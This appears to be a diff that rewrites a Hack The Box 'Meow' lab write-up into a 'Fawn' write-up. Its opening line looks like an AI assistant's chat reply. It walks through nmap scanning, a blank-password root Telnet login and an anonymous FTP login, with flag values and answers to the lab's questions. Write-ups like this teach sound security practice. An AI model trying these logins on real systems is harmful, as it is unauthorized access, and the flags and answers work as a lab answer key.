@@ -1,21 +1,22 @@
----
+Here is the complete write-up for **Fawn** formatted inside a single code block so you can easily hit **Copy** and paste it straight into your GitHub repository:
 
-# 🎯 Hack The Box: Meow Write-up
+```markdown
+# 🎯 Hack The Box: Fawn Write-up
 
 ---
 
 ## 📌 Machine Overview
 
 | Parameter | Value |
-| --- | --- |
-| **Machine Name** | Meow |
+| :--- | :--- |
+| **Machine Name** | Fawn |
 | **OS** | Linux |
 | **Difficulty** | Very Easy |
 | **Target IP** | *(Dynamic HTB IP)* |
-| **Primary Service** | Telnet |
-| **Port** | `23/TCP` |
-| **Vulnerability** | Blank Default `root` Password |
-| **Root Flag** | `b40abdfe23665f766f9c61ecba8a4c19` |
+| **Primary Service** | FTP |
+| **Port** | `21/TCP` |
+| **Vulnerability** | Anonymous FTP Login Allowed |
+| **Root Flag** | `035844102705c01438cb702323ef7096` |
 
 ---
 
@@ -23,7 +24,7 @@
 
 ### 1. Host Reachability Check
 
-First, we verified basic network connectivity to the target machine using `ping` to ensure our OpenVPN tunnel was communicating with the target:
+First, we verified network connectivity to the target machine using `ping`:
 
 ```bash
 ping -c 4 <TARGET_IP>
@@ -32,7 +33,7 @@ ping -c 4 <TARGET_IP>
 
 ### 2. Service Enumeration (`Nmap`)
 
-We ran an initial port scan with `nmap` using service version detection (`-sV`) to identify open ports and active software versions:
+We scanned open ports and service versions using `nmap`:
 
 ```bash
 nmap -sV <TARGET_IP>
@@ -43,51 +44,58 @@ nmap -sV <TARGET_IP>
 
 ```text
 PORT   STATE SERVICE VERSION
-23/tcp open  telnet  Linux telnetd
-Service Info: OS: Linux
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
 
 ```
 
-### 3. Exploitation (Telnet Remote Access)
+### 3. Exploitation (Anonymous FTP Access)
 
-The port scan revealed Telnet active on TCP port 23. Telnet is an unencrypted legacy protocol that often contains misconfigured administrative defaults. We connected directly to the target via the native Telnet client:
+The scan revealed FTP running on TCP port 21 with anonymous authentication enabled. We connected to the target using the FTP client:
 
 ```bash
-telnet <TARGET_IP>
+ftp <TARGET_IP>
 
 ```
 
-When prompted for credentials, we tested common administrative defaults by supplying `root` as the login username and pressing **Enter** (leaving the password blank):
+When prompted for a username, we entered `anonymous` and pressed **Enter** for the password (leaving it blank):
 
 **Terminal Session:**
 
 ```text
-Trying <TARGET_IP>...
 Connected to <TARGET_IP>.
-Escape character is '^]'.
-
-Meow login: root
-Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
-root@Meow:~# 
+220 (vsFTPd 3.0.3)
+Name (<TARGET_IP>:user): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> 
 
 ```
 
 ### 4. Flag Retrieval
 
-Upon authenticating as `root`, we verified our access level and read the flag file located in the root user's home directory:
+Once authenticated, we listed the remote directory, located `flag.txt`, and downloaded it to our local system using `get`:
+
+```ftp
+ftp> ls
+227 Entering Passive Mode (...)
+-rw-r--r--    1 0        0              33 Sep 08  2021 flag.txt
+
+ftp> get flag.txt
+226 Transfer complete.
+
+ftp> exit
+
+```
+
+Back in our local terminal, we read the contents of the downloaded flag file:
 
 ```bash
-root@Meow:~# id
-uid=0(root) gid=0(root) groups=0(root)
-
-root@Meow:~# ls -la
-total 24
-drwx------  2 root root 4096 Sep  6  2021 .
-drwxr-xr-x 18 root root 4096 Sep  6  2021 ..
--rw-r--r--  1 root root  32 Sep  6  2021 flag.txt
-
-root@Meow:~# cat flag.txt
-b40abdfe23665f766f9c61ecba8a4c19
+cat flag.txt
+035844102705c01438cb702323ef7096
 
 ```
 
@@ -97,13 +105,13 @@ b40abdfe23665f766f9c61ecba8a4c19
 
 | Command | Environment | Purpose / Description |
 | --- | --- | --- |
-| `ping -c 4 <IP>` | Local Terminal | Sends 4 ICMP echo requests to confirm network connectivity to target host |
-| `nmap -sV <IP>` | Local Terminal | Scans open ports and inspects service banners to determine running software versions |
-| `telnet <IP>` | Local Terminal | Opens an unencrypted interactive shell connection over TCP port 23 |
-| `id` | Remote Shell | Displays current user identity, user ID (UID), and group memberships |
-| `ls -la` | Remote Shell | Lists all files in the directory including hidden files and permissions |
-| `cat flag.txt` | Remote Shell | Prints the contents of `flag.txt` directly to the console screen |
-| `exit` / `logout` | Remote Shell | Terminates the active Telnet session safely |
+| `ping -c 4 <IP>` | Local Terminal | Sends 4 ICMP echo requests to confirm reachability |
+| `nmap -sV <IP>` | Local Terminal | Detects open ports, services, and anonymous FTP scripts |
+| `ftp <IP>` | Local Terminal | Initiates an interactive FTP session to the target host |
+| `ls` | FTP Prompt | Lists files and directories on the remote FTP server |
+| `get <filename>` | FTP Prompt | Downloads a specified file from the FTP server to your local machine |
+| `exit` / `bye` | FTP Prompt | Closes the active FTP connection |
+| `cat flag.txt` | Local Terminal | Displays the flag content saved locally |
 
 ---
 
@@ -114,20 +122,20 @@ b40abdfe23665f766f9c61ecba8a4c19
 | **1** | What acronym is used for the VM network interface? | `VM` |
 | **2** | What tool do we use to send ICMP echo requests? | `ping` |
 | **3** | What tool is used for port scanning and service detection? | `nmap` |
-| **4** | What service is running on TCP port 23? | `telnet` |
-| **5** | What username allowed login with a blank password? | `root` |
-| **Flag** | Submit the flag located on the server | `b40abdfe23665f766f9c61ecba8a4c19` |
+| **4** | What service is running on TCP port 21? | `ftp` |
+| **5** | What username can be used to log into FTP without a personal account? | `anonymous` |
+| **6** | What response code indicates login success? | `230` |
+| **7** | What command downloads a file from the FTP server? | `get` |
+| **Flag** | Submit the flag located on the server | `035844102705c01438cb702323ef7096` |
 
 ---
 
 ## 💡 Core Takeaways & Remediation
 
-Insecure Transmission: Telnet transmits all data—including credentials and console output—in plain text. Attackers on the local network path can capture session data using packet sniffers like Wireshark.
+1. **Anonymous Access Risk:** Enabling anonymous logins on FTP allows unauthorized users to read, upload, or modify files depending on permission settings.
+2. **Cleartext Protocol:** Standard FTP transmits authentication and data in unencrypted cleartext over the wire.
+3. **Remediation:** Disable anonymous access in `vsftpd.conf` (`anonymous_enable=NO`) and upgrade to secure alternatives like **SFTP (SSH File Transfer Protocol)** or **FTPS (FTP over TLS)**.
 
-Default Credential Vulnerability: Leaving high-privilege accounts like root accessible with empty or default passwords presents a critical security flaw.
+```
 
-Remediation: Disable legacy Telnet daemons (telnetd) and replace them with SSH (Secure Shell) on TCP port 22 to enforce end-to-end encryption and key-based authentication.
-
-1. **Insecure Transmission:** Telnet transmits all data—including credentials and console output—in plain text. Attackers on the local network path can capture session data using packet sniffers like Wireshark.
-2. **Default Credential Vulnerability:** Leaving high-privilege accounts like `root` accessible with empty or default passwords presents a critical security flaw.
-3. **Remediation:** Disable legacy Telnet daemons (`telnetd`) and replace them with **SSH (Secure Shell)** on TCP port 22 to enforce end-to-end encryption and key-based authentication.
+```
